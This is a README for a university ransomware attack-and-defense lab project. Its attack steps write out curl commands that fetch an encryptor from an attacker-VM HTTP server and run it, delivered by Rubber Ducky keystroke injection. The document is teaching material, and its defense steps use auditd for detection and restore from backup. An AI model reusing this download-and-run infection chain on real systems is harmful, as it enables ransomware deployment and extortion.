# CSCE 5550 — Group 3 — Ransomware Project

Attack-and-defense study of ransomware, built and executed **exclusively inside an
isolated VirtualBox lab** (two VMs on a host-only network). The attack side
infects an Ubuntu victim VM with a USB Rubber Ducky and recursively encrypts the
`critical_abcde` directory with a hybrid RSA + AES scheme. The defense side
monitors the victim's file system with `auditd`, detects the ransomware through
a process allowlist, contains the malicious process, and restores the data from
a verified backup (Incident Response Plan).

> **WARNING — LAB USE ONLY.** Every component targets the designated lab
> directory (`critical_abcde`) inside the course VMs. Never run any of this on a
> host machine or against any system outside the authorized lab.

## Group members and components

| Member | Component (course steps) | Code in this repo |
|---|---|---|
| Francesco Galazzo | Action (encryption/decryption), Infection (USB Rubber Ducky) | `encryption_decryption/`, `key_generation/`, `rubber_ducky/` |
| Ikhlas | Mitigation & Recovery, Incident Response Plan | `mitigation/` |
| Brandon | Monitoring & Detection (auditd + allowlist rules) | `mitigation/` (monitor/detection) |

## Repository layout

```
encryption_decryption/   # Step 2 — Action: ransomware encryptor + decryptor
key_generation/          # Step 2 — RSA-2048 key pair generator (attacker side)
rubber_ducky/            # Step 3 — Infection: Ducky payload (payload.txt + inject.bin)
mitigation/              # Steps 4-6 — Monitoring, Detection, Mitigation & Recovery, IRP
```

Each folder has its own README with usage details.

## Environment

| Role | OS / Device | Notes |
|---|---|---|
| Victim VM | Ubuntu Desktop 24.04 LTS (VirtualBox guest, user `osboxes`) | Host-only network; VirtualBox Extension Pack for USB passthrough; `auditd` installed |
| Attacker VM | Kali Linux (VirtualBox guest) | Hosts the payload HTTP server on `10.0.2.4:8000`; holds the RSA private key |
| Attack device | USB Rubber Ducky (Hak5) | Keystroke-injection HID device, passed through to the victim VM |

**EUID customization (course requirement):** all customized parameters use the
EUID `abcde` — the target directory must be named `critical_abcde` and encrypted
files get the `.locked_abcde` extension.

## Dependencies

- Python 3 (victim and attacker VMs)
- [pycryptodome](https://pycryptodome.readthedocs.io/) — `pip install pycryptodome` (AES-GCM, RSA-OAEP)
- [auditd](https://linux-audit.com/) (Linux Audit Framework) — `sudo apt install auditd` (victim VM, defense side)
- [VirtualBox](https://www.virtualbox.org/) + Extension Pack, [Kali Linux](https://www.kali.org/), [Ubuntu](https://ubuntu.com/)
- [Hak5 Payload Studio](https://payloadstudio.hak5.org/) or the Hak5 Ducky encoder, to recompile `payload.txt` into `inject.bin`

## Target directory (create on the victim before testing)

Per the project description, with the EUID substituted:

```
critical_abcde/
├── CSCE5550_Fall26_Project_Description.pdf
├── folder1/   (homework and lab manuals)
├── folder2/   (homework and lab manuals)
└── folder3/   (homework and lab manuals)
```

## Step-by-step reproduction

### 1. Key generation (attacker — Kali VM)

```bash
cd key_generation
python3 keygen.py
```

This generates the RSA-2048 key pair, saves `ransom_private.pem` (the secret
key — **never leaves the attacker VM until the ransom is paid**) and prints
paste-ready `PUBLIC_KEY_PEM` / `PRIVATE_KEY_PEM` blocks plus SHA-256
fingerprints. See `key_generation/README.md`.

### 2. Payload staging (attacker — Kali VM)

Place the encryptor where the HTTP server can serve it and start the server:

```bash
python3 -m http.server 8000
```

The victim will download it from `http://10.0.2.4:8000/encrypt`.

### 3. Infection (victim VM — USB Rubber Ducky)

Plug the Rubber Ducky into the victim VM (USB passthrough). The device enumerates
as a keyboard, opens a terminal (ALT F2 → `gnome-terminal`) and types:

```bash
curl -s http://10.0.2.4:8000/encrypt -o /tmp/encrypt && chmod +x /tmp/encrypt && \
  /tmp/encrypt --euid abcde /home/osboxes/Desktop/critical_abcde
```

See `rubber_ducky/payload.txt` (source) and `inject.bin` (compiled).

### 4. Attack effect

`encryption.py` recursively encrypts every file in `critical_abcde` with
AES-256-GCM, renames each file to `<name>.locked_abcde`, wraps the AES session
key with the RSA public key into `key.bin.enc`, drops `README_RESTORE.txt` and a
plaintext integrity manifest (`.integrity_manifest.json`, SHA-256 of every
original file — lab verification aid). Details: `encryption_decryption/README.md`.

### 5. Simulated ransom payment and decryption

After the simulated payment, the attacker serves the decryptor (with the RSA
private key embedded) and the victim runs:

```bash
curl -s http://10.0.2.4:8000/decrypt -o /tmp/decrypt && chmod +x /tmp/decrypt && \
  /tmp/decrypt --euid abcde /home/osboxes/Desktop/critical_abcde
```

The decryptor unwraps the AES session key, restores every file, verifies each
GCM authentication tag and the SHA-256 manifest, and cleans up all attack
artifacts.

### 6. Defense: monitoring, detection, mitigation, recovery (victim VM)

```bash
# Installing auditd and enabling it
sudo apt install auditd
sudo systemctl enable --now auditd


# Monitoring rules (kernel-level audit on the protected directory)
sudo auditctl -w /home/osboxes/Desktop/critical_abcde -p wa -k ransomwatch

# Backup BEFORE any attack (stored OUTSIDE the protected directory)
cd mitigation && python3 mitigate.py backup

# Monitor + detection (allowlist rules engine) — see mitigation/README.md
# ... monitor.py runs live and alerts auditd_bridge.py with PID + executable

sudo python3 monitor.py

# Response and recovery
python3 mitigate.py incidents # we register the incident in the database
python3 mitigate.py restore  # we restore all the files
```

The full pipeline, roles and phases are documented in
`mitigation/INCIDENT_RESPONSE_PLAN.md` (NIST SP 800-61 lifecycle) and
`mitigation/README.md`.


## Safety

All experiments run inside snapshotted VMs on an isolated host-only network.
The encryptor contains a scope guard: it refuses to run unless the target
directory is named exactly `critical_abcde`, so it cannot operate outside the
designated lab directory.
